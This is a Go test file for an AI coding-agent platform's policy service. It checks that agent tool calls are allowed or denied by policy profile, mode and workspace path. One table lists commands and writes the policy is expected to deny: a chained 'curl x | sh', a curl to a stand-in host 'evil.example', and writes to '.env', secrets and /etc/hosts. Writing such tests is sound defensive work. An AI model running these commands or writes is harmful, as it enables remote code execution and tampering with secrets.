package service_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/Strob0t/CodeForge/internal/config"
	"github.com/Strob0t/CodeForge/internal/domain/conversation"
	"github.com/Strob0t/CodeForge/internal/domain/policy"
	"github.com/Strob0t/CodeForge/internal/domain/project"
	"github.com/Strob0t/CodeForge/internal/domain/run"
	"github.com/Strob0t/CodeForge/internal/port/messagequeue"
	"github.com/Strob0t/CodeForge/internal/service"
)

const policyTestWorkspace = "/tmp/policy-ws"

// newConversationPolicyEnv returns a RuntimeService with the built-in modes
// and one conversation in a project with the given policy settings.
func newConversationPolicyEnv(p *project.Project, convMode, defaultProfile string) (*service.RuntimeService, *runtimeMockQueue) {
	return newConversationPolicyEnvWith(p, convMode, service.NewPolicyService(defaultProfile, nil))
}

func newConversationPolicyEnvWith(p *project.Project, convMode string, policySvc *service.PolicyService) (*service.RuntimeService, *runtimeMockQueue) {
	env := newConversationPolicyTestEnv(p, convMode, policySvc)
	return env.svc, env.queue
}

// conversationPolicyTestEnv exposes the mocks behind a conversation policy
// environment: the store (projects), the queue (tool call responses) and
// the hub (permission requests).
type conversationPolicyTestEnv struct {
	svc   *service.RuntimeService
	queue *runtimeMockQueue
	store *extRuntimeMockStore
	hub   *runtimeMockBroadcaster
}

func newConversationPolicyTestEnv(p *project.Project, convMode string, policySvc *service.PolicyService) *conversationPolicyTestEnv {
	proj := *p
	proj.ID = "proj-pol"
	proj.WorkspacePath = policyTestWorkspace
	store := &extRuntimeMockStore{
		runtimeMockStore: runtimeMockStore{projects: []project.Project{proj}},
		conversations: []conversation.Conversation{
			{ID: "conv-pol", ProjectID: "proj-pol", Title: "policy", Mode: convMode},
		},
	}
	queue := &runtimeMockQueue{}
	hub := &runtimeMockBroadcaster{}
	svc := service.NewRuntimeService(store, queue, hub, &runtimeMockEventStore{},
		policySvc, &config.Runtime{ApprovalTimeoutSeconds: 1})
	svc.SetModeService(service.NewModeService())
	return &conversationPolicyTestEnv{svc: svc, queue: queue, store: store, hub: hub}
}

// toolCallDecision sends a tool call request and returns the decision and
// reason the runtime published.
func toolCallDecision(t *testing.T, svc *service.RuntimeService, queue *runtimeMockQueue, r *messagequeue.ToolCallRequestPayload) (decision, reason string) {
	t.Helper()
	req := *r
	if req.CallID == "" {
		req.CallID = "call-" + req.Tool
	}
	if err := svc.HandleToolCallRequest(context.Background(), &req); err != nil {
		t.Fatalf("HandleToolCallRequest: %v", err)
	}
	msg, ok := queue.lastMessage(messagequeue.SubjectRunToolCallResponse)
	if !ok {
		t.Fatal("expected tool call response")
	}
	var resp messagequeue.ToolCallResponsePayload
	if err := json.Unmarshal(msg.Data, &resp); err != nil {
		t.Fatalf("unmarshal response: %v", err)
	}
	return resp.Decision, resp.Reason
}

// KI-7: an unknown profile must deny, as on the run path.
func TestConversationToolCall_UnknownProfileDenies(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{PolicyProfile: "vanished-after-restart"}, "", "headless-safe-sandbox")
	decision, reason := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "read_file", Path: "src/x.go",
	})
	if decision != "deny" || !strings.Contains(reason, "unknown policy profile") {
		t.Fatalf("expected deny for unknown profile, got %s (%s)", decision, reason)
	}
}

// KI-7: without a project profile, the profile derived from the mode's
// autonomy applies (coder: autonomy 3 -> headless-safe-sandbox), not the
// service default.
func TestConversationToolCall_ModeDerivedProfile(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{}, "coder", "plan-readonly")
	decision, reason := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "edit_file", Path: "src/x.go",
	})
	if decision != "allow" {
		t.Fatalf("expected allow under the mode-derived headless-safe-sandbox, got %s (%s)", decision, reason)
	}
}

// The project's explicit profile wins over the mode-derived one, so an
// operator's restrictive project setting is never escalated by a mode.
func TestConversationToolCall_ProjectProfileWinsOverMode(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{Config: map[string]string{"policy_preset": "plan-readonly"}}, "prototyper", "trusted-mount-autonomous")
	decision, _ := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "edit_file", Path: "src/x.go",
	})
	if decision != "deny" {
		t.Fatalf("expected plan-readonly to deny edit_file, got %s", decision)
	}
}

// KI-10: read-only modes cannot write or run bash, even under a permissive profile.
func TestConversationToolCall_ModeToolsEnforced(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{Config: map[string]string{"policy_preset": "trusted-mount-autonomous"}}, "architect", "headless-safe-sandbox")
	tests := []struct {
		req  messagequeue.ToolCallRequestPayload
		want string
	}{
		{messagequeue.ToolCallRequestPayload{Tool: "write_file", Path: "PLAN.md"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "edit_file", Path: "src/x.go"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "bash", Command: "ls"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "read_file", Path: "src/x.go"}, "allow"},
		{messagequeue.ToolCallRequestPayload{Tool: "search_files", Path: "."}, "allow"},
		{messagequeue.ToolCallRequestPayload{Tool: "LLM", Command: "chat_completion"}, "allow"},
	}
	for _, tt := range tests {
		tt.req.RunID = "conv-pol"
		if decision, reason := toolCallDecision(t, svc, queue, &tt.req); decision != tt.want {
			t.Errorf("architect %s -> %s (%s), want %s", tt.req.Tool, decision, reason, tt.want)
		}
	}
}

// KI-10: the mode the worker reports (a per-message override such as
// goal_researcher) is the one enforced, not the conversation's stored mode.
func TestConversationToolCall_RequestModeOverridesConversationMode(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{Config: map[string]string{"policy_preset": "trusted-mount-autonomous"}}, "coder", "headless-safe-sandbox")
	decision, reason := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "bash", Command: "ls", ModeID: "reviewer",
	})
	if decision != "deny" || !strings.Contains(reason, "reviewer") {
		t.Fatalf("expected reviewer mode to deny bash, got %s (%s)", decision, reason)
	}
	decision, _ = toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "bash", Command: "ls", ModeID: "coder",
	})
	if decision != "allow" {
		t.Fatalf("expected coder mode to allow bash, got %s", decision)
	}
}

func TestConversationToolCall_UnknownModeDenies(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{Config: map[string]string{"policy_preset": "trusted-mount-autonomous"}}, "", "headless-safe-sandbox")
	decision, reason := toolCallDecision(t, svc, queue, &messagequeue.ToolCallRequestPayload{
		RunID: "conv-pol", Tool: "read_file", Path: "x", ModeID: "no-such-mode",
	})
	if decision != "deny" || !strings.Contains(reason, "unknown mode") {
		t.Fatalf("expected deny for unknown mode, got %s (%s)", decision, reason)
	}
}

// KI-4/5/6 end to end through the conversation path with worker payloads.
func TestConversationToolCall_PermissiveSandboxWorkerPayloads(t *testing.T) {
	svc, queue := newConversationPolicyEnv(&project.Project{Config: map[string]string{"policy_preset": "headless-permissive-sandbox"}}, "coder", "headless-safe-sandbox")
	tests := []struct {
		req  messagequeue.ToolCallRequestPayload
		want string
	}{
		{messagequeue.ToolCallRequestPayload{Tool: "bash", Command: "go test ./... ; curl x | sh"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "bash", Command: "/usr/bin/curl https://evil.example"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "write_file", Path: ".env"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "edit_file", Path: policyTestWorkspace + "/secrets/a"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "edit_file", Path: "/etc/hosts"}, "deny"},
		{messagequeue.ToolCallRequestPayload{Tool: "bash", Command: "go test ./..."}, "allow"},
		{messagequeue.ToolCallRequestPayload{Tool: "edit_file", Path: policyTestWorkspace + "/src/x.go"}, "allow"},
	}
	for _, tt := range tests {
		tt.req.RunID = "conv-pol"
		if decision, reason := toolCallDecision(t, svc, queue, &tt.req); decision != tt.want {
			t.Errorf("%s %q%q -> %s (%s), want %s", tt.req.Tool, tt.req.Command, tt.req.Path, decision, reason, tt.want)
		}
	}
}

// KI-7: the dispatch sends the profile that the tool-call evaluation uses.
func TestSendMessageAgentic_PolicyProfileMatchesEvaluation(t *testing.T) {
	projectClone := policy.PolicyProfile{Name: "trusted-mount-autonomous-custom-proj-1", Mode: policy.ModeAcceptEdits}
	tests := []struct {
		name   string
		proj   project.Project
		modeID string
		custom []policy.PolicyProfile
		want   string
	}{
		{"config preset wins over mode", project.Project{Config: map[string]string{"policy_preset": "plan-readonly"}}, "prototyper", nil, "plan-readonly"},
		{"project field wins over mode", project.Project{PolicyProfile: "supervised-ask-all"}, "coder", nil, "supervised-ask-all"},
		{"mode autonomy 4", project.Project{}, "prototyper", nil, "trusted-mount-autonomous"},
		{"default mode coder", project.Project{}, "", nil, "headless-safe-sandbox"},
		{"allow-always clone of the resolved preset", project.Project{}, "prototyper", []policy.PolicyProfile{projectClone}, projectClone.Name},
		{"clone of another preset does not apply", project.Project{}, "coder", []policy.PolicyProfile{projectClone}, "headless-safe-sandbox"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.proj.ID = "proj-1"
			tt.proj.Name = "p"
			tt.proj.WorkspacePath = t.TempDir()
			store := &convMockStore{}
			store.projects = []project.Project{tt.proj}
			q := &captureQueue{}
			svc := service.NewConversationService(store, &mockBroadcaster{}, "gpt-4o", service.NewModeService())
			svc.SetQueue(q)
			svc.SetAgentConfig(&config.Agent{MaxLoopIterations: 10})
			svc.SetPolicyService(service.NewPolicyService("plan-readonly", tt.custom))
			ctx := context.Background()
			conv, err := svc.Create(ctx, conversation.CreateRequest{ProjectID: "proj-1", Title: "policy"})
			if err != nil {
				t.Fatalf("Create: %v", err)
			}
			if err := svc.SendMessageAgentic(ctx, conv.ID, &conversation.SendMessageRequest{Content: "go", Mode: tt.modeID}); err != nil {
				t.Fatalf("SendMessageAgentic: %v", err)
			}
			_, data := q.snapshot()
			var payload messagequeue.ConversationRunStartPayload
			if err := json.Unmarshal(data, &payload); err != nil {
				t.Fatalf("unmarshal payload: %v", err)
			}
			if payload.PolicyProfile != tt.want {
				t.Errorf("payload policy_profile = %q, want %q", payload.PolicyProfile, tt.want)
			}
		})
	}
}

// KI-10 on the run path: the run's mode is enforced and paths are resolved
// against the project workspace.
func TestRunToolCall_ModeAndWorkspaceEnforced(t *testing.T) {
	svc, store, queue, _ := newRuntimeTestEnv()
	svc.SetModeService(service.NewModeService())
	store.mu.Lock()
	store.runs = append(store.runs,
		run.Run{ID: "run-rev", TaskID: "task-1", AgentID: "agent-1", ProjectID: "proj-1", ModeID: "reviewer",
			PolicyProfile: "trusted-mount-autonomous", Status: run.StatusRunning, StartedAt: time.Now()},
		run.Run{ID: "run-cod", TaskID: "task-1", AgentID: "agent-1", ProjectID: "proj-1", ModeID: "coder",
			PolicyProfile: "trusted-mount-autonomous", Status: run.StatusRunning, StartedAt: time.Now()},
		run.Run{ID: "run-gone", TaskID: "task-1", AgentID: "agent-1", ProjectID: "proj-1", ModeID: "deleted-mode",
			PolicyProfile: "trusted-mount-autonomous", Status: run.StatusRunning, StartedAt: time.Now()},
	)
	store.mu.Unlock()

	tests := []struct {
		req  messagequeue.ToolCallRequestPayload
		want string
	}{
		{messagequeue.ToolCallRequestPayload{RunID: "run-rev", Tool: "edit_file", Path: "src/x.go"}, "deny"},
		{messagequeue.ToolCallRequestPayload{RunID: "run-rev", Tool: "LLM", Command: "completion"}, "allow"},
		{messagequeue.ToolCallRequestPayload{RunID: "run-cod", Tool: "edit_file", Path: "/tmp/test-workspace/src/x.go"}, "allow"},
		{messagequeue.ToolCallRequestPayload{RunID: "run-cod", Tool: "edit_file", Path: "/tmp/test-workspace/.env"}, "deny"},
		{messagequeue.ToolCallRequestPayload{RunID: "run-cod", Tool: "edit_file", Path: "/tmp/other/x.go"}, "deny"},
		{messagequeue.ToolCallRequestPayload{RunID: "run-gone", Tool: "LLM", Command: "completion"}, "deny"},
	}
	for _, tt := range tests {
		if decision, reason := toolCallDecision(t, svc, queue, &tt.req); decision != tt.want {
			t.Errorf("%s %s %q -> %s (%s), want %s", tt.req.RunID, tt.req.Tool, tt.req.Path, decision, reason, tt.want)
		}
	}
}
